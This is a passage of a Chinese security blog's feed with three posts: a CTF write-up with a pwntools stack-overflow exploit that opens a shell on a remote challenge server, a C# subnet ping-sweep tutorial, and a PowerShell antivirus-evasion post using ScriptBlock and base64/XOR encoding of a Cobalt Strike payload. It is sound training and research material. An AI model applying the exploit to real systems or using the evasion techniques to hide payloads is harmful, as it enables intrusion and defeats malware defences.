buf[<span class="number">0</span>] != <span class="number">51</span> )<span class="comment">;</span></span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>注意看第18行的代码。非常简单，单纯的读取一串字符串，然后储存在<code>buf</code>里面，但是，开辟的缓存区只有<code>0x50</code>字节大小，但是<code>read</code>最多可以读取<code>0x280</code>字节大小，这样就会造成缓存区溢出，也就是栈溢出漏洞。</p><p>接下来再看<code>ExecCmd()</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ExecCmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [sp+0h] [bp-10h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(strUsername, <span class="string">"admin"</span>) ) <span class="comment">//判断是否为admin用户</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Command: "</span>, <span class="string">"admin"</span>, <span class="number">0L</span>L);</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">    fgets(cmd, <span class="number">255</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v1 = <span class="built_in">strchr</span>(cmd, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      *v1 = <span class="number">0</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Sorry, this feature has been disabled."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Sorry, this feature is only available for admin"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要做的：如下图，程序不经过红框内，直接跳过输出。</p><p><img src="/image/ISCC-2018/Pwn1.png" alt=""></p><p>也就是将<code>return</code>修改到<code>call system</code>，记住交互的最后还得输入一个3退出while循环</p><p>脚本：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'47.104.16.75'</span>,<span class="number">9000</span>)</span><br><span class="line">#p = process(<span class="string">'./pwn50'</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"admin"</span>)              #Send username</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"T6OBSh2i"</span>)       #Send password</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)                        #Choose <span class="number">1.</span> exec command</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)            #Send cmd</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">p.sendline(<span class="string">"\x90"</span>*<span class="number">0x58</span> + p64(<span class="number">0x40084A</span>))       #Change return address</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag{welcome_to_iscc}</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p>附件地址：<a href="https://pan.baidu.com/s/1cWKBmVl1xTiaSWaODt5Rlw" target="_blank" rel="noopener">小试牛刀</a></p><p>拖进<code>JEB2</code>，查看<code>Manifest</code>、<code>action</code>等基础信息。这道题的坑就是壳的问题。</p><p><img src="/image/ISCC-2018/Mobile1.png" alt=""></p><p>后来发现，<code>Assets</code>中的<code>bfsprotect.jar</code>就是源码。</p><p><img src="/image/ISCC-2018/Mobile1-1.png" alt=""></p><p>右键<code>MainActivity</code>选择<code>Decompile</code>查看源码，一览无遗。</p><p>在<code>onCreate()</code>中发现了下面这个判断，与APP页面的判断显示一致。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg5)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">new</span> ProtectClass().protectMethod(MainActivity.<span class="keyword">this</span>.editText.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"Wrong Flag"</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"Correct Flag"</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>进入<code>ProtectClass()</code>查看，就能看到对比的值，也就是flag值</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">protectMethod</span><span class="params">(String arg4)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1;</span><br><span class="line">    <span class="keyword">for</span>(v1 = <span class="number">0</span>; v1 &lt; MainActivity.runTimes &gt;&gt; <span class="number">1</span>; ++v1) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">return</span> arg4.<span class="title">equals</span><span class="params">(<span class="string">"BFS-ISCC"</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者，打开<code>bfsprotect.jar</code>，直接搜索<code>iscc</code>即可得到flag</p><p><img src="/image/ISCC-2018/Mobile1-2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;又一年，不过今年的质量有些…..&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://rcoil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://rcoil.me/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://rcoil.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>C段ping操作（C#入门）</title>
    <link href="https://rcoil.me/2018/04/C%E6%AE%B5ping%E6%93%8D%E4%BD%9C/"/>
    <id>https://rcoil.me/2018/04/C段ping操作/</id>
    <published>2018-04-14T06:37:56.000Z</published>
    <updated>2018-04-24T13:07:56.961Z</updated>
    
    <content type="html"><![CDATA[<p>利用周末，造个轮子，学习C#！！</p><a id="more"></a><h2 id="官方examples"><a href="#官方examples" class="headerlink" title="官方examples"></a>官方examples</h2><p>查看官方的Ping类，已经很成熟了。以下为官方<code>examples</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Main (string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Ping pingSender = <span class="keyword">new</span> Ping ();</span><br><span class="line">            PingOptions <span class="keyword">options</span> = <span class="keyword">new</span> PingOptions ();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Use the default Ttl value which is 128,</span></span><br><span class="line">            <span class="comment">// but change the fragmentation behavior.</span></span><br><span class="line">            <span class="keyword">options</span>.DontFragment = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create a buffer of 32 bytes of data to be transmitted.</span></span><br><span class="line">            string data = <span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = Encoding.ASCII.GetBytes (data);</span><br><span class="line">            <span class="keyword">int</span> timeout = <span class="number">120</span>;</span><br><span class="line">            PingReply reply = pingSender.Send (args[<span class="number">0</span>], timeout, buffer, <span class="keyword">options</span>);</span><br><span class="line">            <span class="keyword">if</span> (reply.Status == IPStatus.Success)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.<span class="keyword">WriteLine</span> (<span class="string">"Address: &#123;0&#125;"</span>, reply.Address.ToString ());</span><br><span class="line">                Console.<span class="keyword">WriteLine</span> (<span class="string">"RoundTrip time: &#123;0&#125;"</span>, reply.RoundtripTime);</span><br><span class="line">                Console.<span class="keyword">WriteLine</span> (<span class="string">"Time to live: &#123;0&#125;"</span>, reply.<span class="keyword">Options</span>.Ttl);</span><br><span class="line">                Console.<span class="keyword">WriteLine</span> (<span class="string">"Don't fragment: &#123;0&#125;"</span>, reply.<span class="keyword">Options</span>.DontFragment);</span><br><span class="line">                Console.<span class="keyword">WriteLine</span> (<span class="string">"Buffer size: &#123;0&#125;"</span>, reply.Buffer.Length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/image/C段ping操作/examples.png" alt=""></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="数据显示"><a href="#数据显示" class="headerlink" title="数据显示"></a>数据显示</h3><p>官方demo中使用的是默认的<code>Ttl</code>（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Console.<span class="keyword">WriteLine</span> (<span class="string">"Address: &#123;0&#125;"</span>, reply.Address.ToString ());</span><br><span class="line">Console.<span class="keyword">WriteLine</span> (<span class="string">"HostName: &#123;0&#125;"</span>, Dns.GetHostEntry(reply.Address.ToString()).HostName);</span><br><span class="line">Console.<span class="keyword">WriteLine</span> (<span class="string">"Time to live: &#123;0&#125;"</span>, reply.<span class="keyword">Options</span>.Ttl);</span><br></pre></td></tr></table></figure><p>这只能识别windows系统的，毕竟是128。emmm。</p><p><img src="/image/C段ping操作/hostname.png" alt=""></p><h3 id="正则匹配IP"><a href="#正则匹配IP" class="headerlink" title="正则匹配IP"></a>正则匹配IP</h3><p>使用正则去匹配输入的IP地址是否合理。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@"<span class="symbol">\d</span>+<span class="symbol">\.</span><span class="symbol">\d</span>+<span class="symbol">\.</span><span class="symbol">\d</span>+<span class="symbol">\.</span><span class="symbol">\d</span>+");// (提取IP地址时有用)</span><br><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@"((?:(?:25[0-5]|2[0-4]<span class="symbol">\\</span>d|[01]?<span class="symbol">\\</span>d?<span class="symbol">\\</span>d)<span class="symbol">\\</span>.)&#123;3&#125;(?:25[0-5]|2[0-4]<span class="symbol">\\</span>d|[01]?<span class="symbol">\\</span>d?<span class="symbol">\\</span>d))");</span><br><span class="line">// IP地址</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>调用处理：</p><p><img src="/image/C段ping操作/regex-1.png" alt=""></p><p>效果：</p><p><img src="/image/C段ping操作/regex.png" alt=""></p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束</p><p><img src="/image/C段ping操作/demo.png" alt=""></p><p>项目地址：<a href="https://github.com/RcoIl/cping" target="_blank" rel="noopener"><i class="fab fa-github" icon-2x=""></i></a></p><p>【参考】</p><p><a href="https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用周末，造个轮子，学习C#！！&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="tools" scheme="https://rcoil.me/tags/tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PowerShell免杀（一）</title>
    <link href="https://rcoil.me/2018/04/%E3%80%90%E5%85%8D%E6%9D%80%E3%80%91PowerShell%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://rcoil.me/2018/04/【免杀】PowerShell免杀（一）/</id>
    <published>2018-04-11T07:23:41.000Z</published>
    <updated>2018-11-26T08:00:42.501Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看免杀<br><a id="more"></a></p><h2 id="0x00-代码块"><a href="#0x00-代码块" class="headerlink" title="0x00 代码块"></a>0x00 代码块</h2><p>可以使用<code>PowerShell</code>的一个语言特性做通用免杀，那就是代码块（即<code>ScriptBlock</code>）。</p><p>代码块是一段可以被执行的PowerShell代码，通常是把代码块直接放在闭合的大括号中，类似函数<code>function</code>，带上代码块更加灵活，可以作为函数参数传递，也可以动态生成和调用。若想在PowerShell中动态创建代码块，首先得知道如何将一段字符串换成代码块对象。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$scriptblock</span> = [SriptBlock]::Create(<span class="string">'notepad'</span>)</span><br></pre></td></tr></table></figure></p><p>先是字符串，然后转换成代码块对象，当然这个字符串也可以是变量。</p><p>调用方法：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="variable">$scriptblock</span></span><br><span class="line">或者可以直接</span><br><span class="line"><span class="built_in">Invoke-Command</span> -ScriptBlock ([ScriptBlock]::Create(<span class="string">'notepad'</span>))</span><br><span class="line">代码块操作操作符(&amp;)</span><br><span class="line">&amp;<span class="variable">$scriptblock</span></span><br></pre></td></tr></table></figure></p><h2 id="0x01-加解密"><a href="#0x01-加解密" class="headerlink" title="0x01 加解密"></a>0x01 加解密</h2><p>先对家吗进行加密，再加密执行</p><p>说到加密，最先想到的就是<code>base64</code>的编码加密了，既然容易想到，那就容易被杀。实现：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"RcoIl"</span></span><br><span class="line"><span class="comment"># $str = [System.IO.File]::ReadAllText("C:\Users\allen\Desktop\payload.ps1");</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Ascii.GetBytes(<span class="variable">$str</span>) <span class="comment"># 编码方式变一下也无所谓</span></span><br><span class="line"><span class="variable">$encode</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)  <span class="comment"># 加密</span></span><br><span class="line"><span class="variable">$encode</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> =[Convert]::FromBase64String(<span class="variable">$encode</span>); <span class="comment">#解密</span></span><br><span class="line"><span class="variable">$byte</span> = [System.Text.Encoding]::Ascii.GetString(<span class="variable">$decode</span>)</span><br><span class="line"><span class="variable">$byte</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">PS C:\Users\allen\Desktop&gt; .\demo.ps1</span><br><span class="line">UmNvSWw=</span><br><span class="line">RcoIl</span><br></pre></td></tr></table></figure></p><p>加上异或<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"RcoIl"</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Ascii.GetBytes(<span class="variable">$str</span>)</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$bytes</span>.count; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$bytes</span>[<span class="variable">$i</span>] = <span class="variable">$bytes</span>[<span class="variable">$i</span>] -bxor <span class="number">0</span>x98 <span class="comment"># 异或</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$encode</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)  <span class="comment"># 加密</span></span><br><span class="line"><span class="variable">$encode</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> =[Convert]::FromBase64String(<span class="variable">$encode</span>); <span class="comment">#解密</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$decode</span>.count; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$decode</span>[<span class="variable">$i</span>] = <span class="variable">$decode</span>[<span class="variable">$i</span>] -bxor <span class="number">0</span>x98 <span class="comment"># 异或</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$byte</span> = [System.Text.Encoding]::Ascii.GetString(<span class="variable">$decode</span>)</span><br><span class="line"><span class="variable">$byte</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">PS C:\Users\allen\Desktop&gt; .\demo.ps1</span><br><span class="line">ypj7mPeY0Zj0mA==</span><br><span class="line">RcoIl</span><br></pre></td></tr></table></figure></p><h2 id="0x02-免杀效果"><a href="#0x02-免杀效果" class="headerlink" title="0x02 免杀效果"></a>0x02 免杀效果</h2><p>payload选择的是Cobalt Strike 3.8生成的payload.ps1<br>编译生成exe.<br><img src="/image/PowerShell免杀（一）/blog_2018-04-11_15-52-59.png" alt=""><br>当然，在实际测试过程中并没有那么完美，至少没能绕过avp的行为查杀。</p><p>【参考】</p><p><a href="https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2" target="_blank" rel="noopener">https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看免杀&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="PowerShell" scheme="https://rcoil.me/tags/PowerShell/"/>
    
  </entry>
  
</feed>
